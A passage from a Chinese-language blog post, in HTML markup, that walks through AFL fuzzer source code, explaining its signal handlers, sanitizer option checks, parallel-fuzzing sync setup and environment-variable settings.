href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_signal_handlers</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>;</span>  <span class="comment">// 声明信号处理结构体</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = <span class="literal">NULL</span>;       <span class="comment">// 先初始化为空处理函数</span></span><br><span class="line">  sa.sa_flags = SA_RESTART;   <span class="comment">// 设置标志位：被中断的系统调用自动重启</span></span><br><span class="line">  sa.sa_sigaction = <span class="literal">NULL</span>;     <span class="comment">// 不使用sa_sigaction处理函数</span></span><br><span class="line"></span><br><span class="line">  sigemptyset(&amp;sa.sa_mask);<span class="comment">// 清空信号掩码（不阻塞任何额外信号）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1. 程序终止信号处理组 (用户中断/系统终止) */</span></span><br><span class="line">  sa.sa_handler = handle_stop_sig; <span class="comment">// 设置统一终止处理函数</span></span><br><span class="line">  sigaction(SIGHUP, &amp;sa, <span class="literal">NULL</span>); <span class="comment">// 终端挂起信号 (通常由终端断开触发)</span></span><br><span class="line">  sigaction(SIGINT, &amp;sa, <span class="literal">NULL</span>); <span class="comment">// 键盘中断信号 (Ctrl+C)</span></span><br><span class="line">  sigaction(SIGTERM, &amp;sa, <span class="literal">NULL</span>);<span class="comment">// 终止信号 (kill命令默认发送)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 2. 执行超时信号处理 */</span></span><br><span class="line">  sa.sa_handler = handle_timeout;  <span class="comment">// 设置超时处理函数</span></span><br><span class="line">  sigaction(SIGALRM, &amp;sa, <span class="literal">NULL</span>);   <span class="comment">// 定时器超时信号 (用于监控目标程序执行时间)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 3. 终端窗口调整信号处理 */</span></span><br><span class="line">  sa.sa_handler = handle_resize;   <span class="comment">// 设置窗口调整处理函数</span></span><br><span class="line">  sigaction(SIGWINCH, &amp;sa, <span class="literal">NULL</span>); <span class="comment">// 终端窗口大小改变信号</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 4. 用户自定义控制信号 */</span></span><br><span class="line">  sa.sa_handler = handle_skipreq;  <span class="comment">// 设置跳过请求处理函数</span></span><br><span class="line">  sigaction(SIGUSR1, &amp;sa, <span class="literal">NULL</span>);   <span class="comment">// 用户自定义信号1 (用于请求跳过当前测试)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 5. 需要忽略的信号处理组 */</span></span><br><span class="line">  sa.sa_handler = SIG_IGN;  <span class="comment">// 设置信号处理为忽略</span></span><br><span class="line">  <span class="comment">// 注册两种忽略信号：</span></span><br><span class="line">  sigaction(SIGTSTP, &amp;sa, <span class="literal">NULL</span>);  <span class="comment">// 终端停止信号 (Ctrl+Z，防止意外挂起)</span></span><br><span class="line">  sigaction(SIGPIPE, &amp;sa, <span class="literal">NULL</span>);  <span class="comment">// 管道破裂信号 (防止写入失败导致崩溃)</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先大致看看sigaction结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span>     (*sa_handler)(<span class="keyword">int</span>);          <span class="comment">// 简单处理函数</span></span><br><span class="line">    <span class="keyword">void</span>     (*sa_sigaction)(<span class="keyword">int</span>, <span class="keyword">siginfo_t</span> *, <span class="keyword">void</span> *); <span class="comment">// 扩展处理函数</span></span><br><span class="line">    <span class="keyword">sigset_t</span>   sa_mask;                   <span class="comment">// 信号屏蔽掩码</span></span><br><span class="line">    <span class="keyword">int</span>        sa_flags;                  <span class="comment">// 特殊行为标志</span></span><br><span class="line">    <span class="keyword">void</span>     (*sa_restorer)(<span class="keyword">void</span>);        <span class="comment">// 已废弃</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以看到对于不同的信号我们设置了不同的处理函数，但是其他的结构体参数保持不变，我们重点看看这几个处理函数</p><p>先来看程序终止信号处理组其处理函数为</p><h3 id="handle-stop-sig"><a href="#handle-stop-sig" class="headerlink" title="handle_stop_sig"></a>handle_stop_sig</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_stop_sig</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 设置全局停止标志，通知主循环尽快退出</span></span><br><span class="line">  stop_soon = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 检查并终止子进程（如果正在运行）</span></span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>)</span><br><span class="line">    kill(child_pid, SIGKILL);  <span class="comment">// 发送SIGKILL强制终止被测试程序</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 检查并终止fork服务器（如果正在运行）</span></span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>)</span><br><span class="line">    kill(forksrv_pid, SIGKILL);  <span class="comment">// 终止fork服务器进程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是中止相关的活动进程</p><p>接下来是</p><h3 id="handle-timeout"><a href="#handle-timeout" class="headerlink" title="handle_timeout"></a>handle_timeout</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_timeout</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 检查并处理子进程超时（正常执行模式）</span></span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    child_timed_out = <span class="number">1</span>;  <span class="comment">// 标记子进程已超时</span></span><br><span class="line">    kill(child_pid, SIGKILL);  <span class="comment">// 强制终止超时的子进程</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 处理fork服务器启动超时（fork server模式）</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (child_pid == <span class="number">-1</span> &amp;&amp; forksrv_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    child_timed_out = <span class="number">1</span>;  <span class="comment">// 标记fork服务器启动超时</span></span><br><span class="line">    kill(forksrv_pid, SIGKILL);  <span class="comment">// 强制终止fork服务器进程</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后的handle_resize函数只有一个<code>clear_screen = 1;</code>,用于// 设置全局标志表示需要刷新界面，handle_skipreq用于跳过测试</p><p>接下来是check_asan_opts函数</p><h2 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_asan_opts</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 获取ASAN_OPTIONS环境变量</span></span><br><span class="line">  u8 *x = getenv(<span class="string">&quot;ASAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x)<span class="comment">// 如果环境变量存在</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 检查关键参数设置是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>((<span class="keyword">char</span> *)x, <span class="string">&quot;abort_on_error=1&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);<span class="comment">// 检测到问题配置时输出错误信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>((<span class="keyword">char</span> *)x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);<span class="comment">// 检测到问题配置时输出错误信息</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 获取MSAN_OPTIONS环境变量</span></span><br><span class="line">  x = getenv(<span class="string">&quot;MSAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) <span class="comment">// 如果环境变量存在</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 检查关键参数设置是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>((<span class="keyword">char</span> *)x, <span class="string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR)))</span><br><span class="line">      FATAL(<span class="string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="string">&quot; - please fix!&quot;</span>); <span class="comment">// 检测到问题配置时输出错误信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>((<span class="keyword">char</span> *)x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>); <span class="comment">// 检测到问题配置时输出错误信息</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是检查配置的ASAN（AddressSanitizer）和MSAN（MemorySanitizer）的环境设置是否正确，这里即使有ASAN，X返回的也是NULL，这里并不是检查是否有ASAN而是检查有无自己的配置，如果没有就采用默认配置</p><p>下面是一个判断</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (sync_id)</span><br><span class="line">    <span class="built_in">fix_up_sync</span>();</span><br></pre></td></tr></table></figure><p><code>if (sync_id)</code> 检查是 AFL 区分<strong>单机模式</strong>和<strong>并行模式</strong>的关键分支：</p><ul><li><strong>sync_id = NULL</strong>：标准单机fuzzing，简单高效</li><li><strong>sync_id != NULL</strong>：并行协作fuzzing，需要额外的目录管理和同步机制</li></ul><p><strong>注意</strong>这里的单机和并行指的是单个AFL实例还是多个AFL实例同时运行</p><p>关于sync_id 有以下逻辑</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 1. sync_id = NULL（默认/单机模式）*/</span></span><br><span class="line"><span class="comment">// 没有使用 -S 或 -M 参数</span></span><br><span class="line"><span class="keyword">if</span> (!sync_id) &#123;</span><br><span class="line">  <span class="comment">// 标准AFL模式</span></span><br><span class="line">  <span class="comment">// 输出目录：output/</span></span><br><span class="line">  <span class="comment">//   ├── queue/</span></span><br><span class="line">  <span class="comment">//   ├── crashes/</span></span><br><span class="line">  <span class="comment">//   └── hangs/</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 不需要同步设置</span></span><br><span class="line">  <span class="comment">// 执行所有变异策略</span></span><br><span class="line">  <span class="comment">// 独立工作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 2. sync_id = &quot;fuzzer1&quot;（-S 从模式）*/</span></span><br><span class="line"><span class="keyword">if</span> (sync_id &amp;&amp; !force_deterministic) &#123;</span><br><span class="line">  <span class="comment">// 从fuzzer模式</span></span><br><span class="line">  <span class="comment">// 输出目录：output/fuzzer1/</span></span><br><span class="line">  <span class="comment">// 同步目录：output/</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 跳过确定性变异</span></span><br><span class="line">  <span class="comment">// 启用拼接策略</span></span><br><span class="line">  <span class="comment">// 定期同步其他fuzzer的发现</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3. sync_id = &quot;master&quot;（-M 主模式）*/</span></span><br><span class="line"><span class="keyword">if</span> (sync_id &amp;&amp; force_deterministic) &#123;</span><br><span class="line">  <span class="comment">// 主fuzzer模式</span></span><br><span class="line">  <span class="comment">// 输出目录：output/master/</span></span><br><span class="line">  <span class="comment">// 同步目录：output/</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 强制执行确定性变异</span></span><br><span class="line">  <span class="comment">// 系统性探索输入空间</span></span><br><span class="line">  <span class="comment">// 生成高质量基础用例</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h2><p>接下来是用于配置分布式模糊测试模式的模块，主要处理 <code>-S</code>（从节点）和 <code>-M</code>（主节点）参数的配置逻辑</p><p>先简单聊聊这几个参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-n (盲测模式)   </span><br><span class="line">→ 设置 dumb_mode = 1</span><br><span class="line">→ 作用：不使用代码覆盖反馈，纯黑盒测试</span><br><span class="line">→ 与 -M/-S 互斥</span><br><span class="line"></span><br><span class="line">-M (主模式)    </span><br><span class="line">→ 设置 sync_id = &lt;id&gt;</span><br><span class="line">→ 设置 force_deterministic = 1</span><br><span class="line">→ 作用：创建主fuzzer，负责完整的确定性变异</span><br><span class="line"></span><br><span class="line">-S (从模式)    </span><br><span class="line">→ 设置 sync_id = &lt;id&gt;</span><br><span class="line">→ 不设置 force_deterministic</span><br><span class="line">→ 作用：创建从fuzzer，负责快速随机变异</span><br><span class="line"></span><br><span class="line">-d (跳过确定性) </span><br><span class="line">→ 设置 skip_deterministic = 1</span><br><span class="line">→ 作用：跳过耗时的确定性变异阶段</span><br><span class="line">→ 与 -M 冲突，-S 自动包含此功能</span><br></pre></td></tr></table></figure><p>代码逻辑如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_up_sync</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 获取同步ID（通过 -S 或 -M 参数设置的分布式fuzzing标识符）</span></span><br><span class="line">  u8 *x = sync_id;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 1. 模式互斥性检查 ========== */</span></span><br><span class="line">  <span class="comment">// dumb_mode (-n) 是盲测模式，不使用代码覆盖引导</span></span><br><span class="line">  <span class="comment">// 分布式模式 (-S/-M) 需要覆盖信息来同步，两者不兼容</span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode)</span><br><span class="line">    FATAL(<span class="string">&quot;-S / -M and -n are mutually exclusive&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 2. 确定性变异策略检查 ========== */</span></span><br><span class="line">  <span class="comment">// skip_deterministic (-d) 表示跳过系统性的确定性变异</span></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// force_deterministic表示强制确定性变异通常由 -M (主模式) 设置</span></span><br><span class="line">    <span class="comment">// 如果同时设置了强制和跳过，说明用户可能想用从模式</span></span><br><span class="line">    <span class="keyword">if</span> (force_deterministic)</span><br><span class="line">      FATAL(<span class="string">&quot;use -S instead of -M -d&quot;</span>);  <span class="comment">// 建议：用 -S 从模式替代 -M -d</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      FATAL(<span class="string">&quot;-S already implies -d&quot;</span>);    <span class="comment">// 提醒：-S 本身就会跳过确定性变异</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 3. 同步ID合法性验证 ========== */</span></span><br><span class="line">  <span class="comment">// 遍历同步ID的每个字符，确保只包含安全字符</span></span><br><span class="line">  <span class="keyword">while</span> (*x)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 允许的字符：a-z, A-Z, 0-9, _, -</span></span><br><span class="line">    <span class="comment">// 禁止路径分隔符等特殊字符，防止路径注入攻击</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*x) &amp;&amp; *x != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *x != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">      FATAL(<span class="string">&quot;Non-alphanumeric fuzzer ID specified via -S or -M&quot;</span>);</span><br><span class="line">    x++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 4. 长度限制检查 ========== */</span></span><br><span class="line">  <span class="comment">// 限制同步ID最长32字符，避免：</span></span><br><span class="line">  <span class="comment">// - 文件系统路径长度问题</span></span><br><span class="line">  <span class="comment">// - 显示界面排版问题</span></span><br><span class="line">  <span class="comment">// - 内存分配效率问题</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(sync_id) &gt; <span class="number">32</span>)</span><br><span class="line">    FATAL(<span class="string">&quot;  ID too long&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 5. 目录结构调整 ========== */</span></span><br><span class="line">  <span class="comment">// 原始结构：out_dir = &quot;output&quot;</span></span><br><span class="line">  <span class="comment">// 调整后：  out_dir = &quot;output/fuzzer1&quot;</span></span><br><span class="line">  <span class="comment">//          sync_dir = &quot;output&quot;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 构建新的输出路径：原目录/同步ID</span></span><br><span class="line">  x = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, out_dir, sync_id);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 保存原始输出目录作为同步根目录</span></span><br><span class="line">  <span class="comment">// 所有fuzzer实例都在这个目录下创建子目录</span></span><br><span class="line">  sync_dir = out_dir;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 更新输出目录为新创建的子目录</span></span><br><span class="line">  <span class="comment">// 每个fuzzer有独立的queue/crashes/hangs目录</span></span><br><span class="line">  out_dir = x;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 6. 变异策略配置 ========== */</span></span><br><span class="line">  <span class="comment">// 如果不是主fuzzer（没有设置force_deterministic）</span></span><br><span class="line">  <span class="keyword">if</span> (!force_deterministic)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 跳过耗时的确定性变异阶段</span></span><br><span class="line">    <span class="comment">// 包括：位翻转、字节翻转、算术操作、字典替换等</span></span><br><span class="line">    skip_deterministic = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启用拼接变异策略</span></span><br><span class="line">    <span class="comment">// 将不同测试用例的片段组合，产生新的输入</span></span><br><span class="line">    use_splicing = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是一个简单的目录对比</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))<span class="comment">//保证输入输出文件夹不是同一个</span></span><br><span class="line">   FATAL(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (dumb_mode)<span class="comment">// -n 参数启用的盲测模式</span></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (crash_mode)<span class="comment">//-C (crash_mode) - 崩溃探索模式</span></span><br><span class="line">      FATAL(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (qemu_mode)<span class="comment">//-Q (qemu_mode) - QEMU模式</span></span><br><span class="line">      FATAL(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>保证输入输出文件夹不是同一个以及检查dump模式下的一些参数,然后就是一些环境变量检测，这里出现了-C和-Q参数，简单说一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-C (crash exploration mode)</span><br><span class="line">→ 设置 crash_mode = 1</span><br><span class="line">→ 作用：深入探索已知的崩溃输入</span><br><span class="line">→ 场景：对已发现的崩溃样本进行变异，寻找更多崩溃</span><br><span class="line">→ 特点：</span><br><span class="line">  - 需要覆盖率信息来引导探索</span><br><span class="line">  - 专注于崩溃路径附近的变异</span><br><span class="line">  - 用于崩溃去重和分类</span><br><span class="line">-Q (QEMU mode)</span><br><span class="line">→ 设置 qemu_mode = 1</span><br><span class="line">→ 作用：使用QEMU进行动态二进制插桩</span><br><span class="line">→ 场景：没有源码，只有二进制文件</span><br><span class="line">→ 特点：</span><br><span class="line">  - 运行时动态获取覆盖率</span><br><span class="line">  - 不需要重新编译</span><br><span class="line">  - 性能开销较大（5-10倍慢）</span><br><span class="line">  - 仍然需要覆盖率反馈</span><br></pre></td></tr></table></figure><p>也就是说要使用这两个参数就一定要插桩来获取覆盖率和路径信息，比如-C需要知道是执行到哪里崩溃了，就一定需要插桩来保证路径信息可以返回，需要覆盖率做引导，-Q的话就本来就是为了在没有原文件的情况下获取覆盖率，本质上就是为了在没有源代码的前提下获取覆盖率，不可能是我要用QEMU模式却不使用覆盖率引导寻找bug。</p><p>接下来是一些通过环境变量来获取AFL参数设置的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ========== 1. Fork Server 控制 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))</span><br><span class="line">    no_forkserver = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AFL_NO_FORKSRV：禁用 fork server 机制</span></span><br><span class="line"><span class="comment"> * Fork Server 是 AFL 的核心优化：</span></span><br><span class="line"><span class="comment"> * - 正常模式：目标程序启动一次，然后通过 fork() 创建子进程测试</span></span><br><span class="line"><span class="comment"> * - 禁用后：每次测试都完整启动新进程</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 使用场景：</span></span><br><span class="line"><span class="comment"> * - 某些程序与 fork server 不兼容</span></span><br><span class="line"><span class="comment"> * - 调试时需要看到完整的进程启动</span></span><br><span class="line"><span class="comment"> * - 性能影响：可能慢 10-50 倍</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 2. CPU 使用率显示 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))</span><br><span class="line">    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AFL_NO_CPU_RED：禁用 CPU 使用率红色警告</span></span><br><span class="line"><span class="comment"> * - 默认：CPU 使用率低时显示红色警告</span></span><br><span class="line"><span class="comment"> * - 禁用后：不显示红色，适合自动化环境</span></span><br><span class="line"><span class="comment"> * - 用途：CI/CD 系统中避免颜色输出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 3. 算术变异控制 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))</span><br><span class="line">    no_arith = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AFL_NO_ARITH：跳过算术变异阶段</span></span><br><span class="line"><span class="comment"> * 算术变异包括：</span></span><br><span class="line"><span class="comment"> * - 整数加减（+1, -1, +35, -35 等）</span></span><br><span class="line"><span class="comment"> * - 对 8/16/32 位值进行算术操作</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 使用场景：</span></span><br><span class="line"><span class="comment"> * - 目标程序不处理数值数据</span></span><br><span class="line"><span class="comment"> * - 加速 fuzzing（跳过约 20% 的确定性变异）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 4. 队列随机化 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>))</span><br><span class="line">    shuffle_queue = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AFL_SHUFFLE_QUEUE：随机化测试用例执行顺序</span></span><br><span class="line"><span class="comment"> * - 默认：按发现顺序执行</span></span><br><span class="line"><span class="comment"> * - 启用后：随机打乱顺序</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 优势：</span></span><br><span class="line"><span class="comment"> * - 避免局部最优</span></span><br><span class="line"><span class="comment"> * - 增加发现新路径的机会</span></span><br><span class="line"><span class="comment"> * - 更好的种子多样性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 5. 快速校准 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))</span><br><span class="line">    fast_cal = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AFL_FAST_CAL：启用快速校准模式</span></span><br><span class="line"><span class="comment"> * 校准过程：</span></span><br><span class="line"><span class="comment"> * - 正常：执行多次（8-40次）确定稳定性</span></span><br><span class="line"><span class="comment"> * - 快速：减少执行次数（3-8次）</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 权衡：</span></span><br><span class="line"><span class="comment"> * - 速度提升：2-3倍</span></span><br><span class="line"><span class="comment"> * - 准确性降低：可能错过不稳定的路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 6. 超时阈值设置 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    hang_tmout = atoi(getenv(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!hang_tmout)</span><br><span class="line">        FATAL(<span class="string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AFL_HANG_TMOUT：自定义 hang 超时时间（毫秒）</span></span><br><span class="line"><span class="comment"> * - 默认：根据目标程序自动计算</span></span><br><span class="line"><span class="comment"> * - 自定义：强制使用指定值</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 示例：</span></span><br><span class="line"><span class="comment"> * AFL_HANG_TMOUT=5000  # 5秒超时</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 注意：设置过小可能误判，过大影响效率</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 7. Fork Server 模式检查 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (dumb_mode == <span class="number">2</span> &amp;&amp; no_forkserver)</span><br><span class="line">    FATAL(<span class="string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * dumb_mode == 2：表示 AFL_DUMB_FORKSRV 模式</span></span><br><span class="line"><span class="comment"> * - 使用简化的 fork server（无插桩但有 fork server）</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 冲突原因：</span></span><br><span class="line"><span class="comment"> * AFL_DUMB_FORKSRV：&quot;使用 fork server 但不要插桩&quot;</span></span><br><span class="line"><span class="comment"> * AFL_NO_FORKSRV：&quot;不要 fork server&quot;</span></span><br><span class="line"><span class="comment"> * 逻辑矛盾！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 8. 预加载库设置 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_PRELOAD&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    setenv(<span class="string">&quot;LD_PRELOAD&quot;</span>, getenv(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">    setenv(<span class="string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, getenv(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AFL_PRELOAD：预加载共享库</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 设置两个变量：</span></span><br><span class="line"><span class="comment"> * - LD_PRELOAD：Linux 的预加载机制</span></span><br><span class="line"><span class="comment"> * - DYLD_INSERT_LIBRARIES：macOS 的预加载机制</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 用途：</span></span><br><span class="line"><span class="comment"> * - 注入自定义库</span></span><br><span class="line"><span class="comment"> * - Hook 系统函数</span></span><br><span class="line"><span class="comment"> * - 添加额外的监控</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 示例：</span></span><br><span class="line"><span class="comment"> * AFL_PRELOAD=/path/to/custom.so</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 9. 废弃变量检查 ========== */</span></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_LD_PRELOAD&quot;</span>))</span><br><span 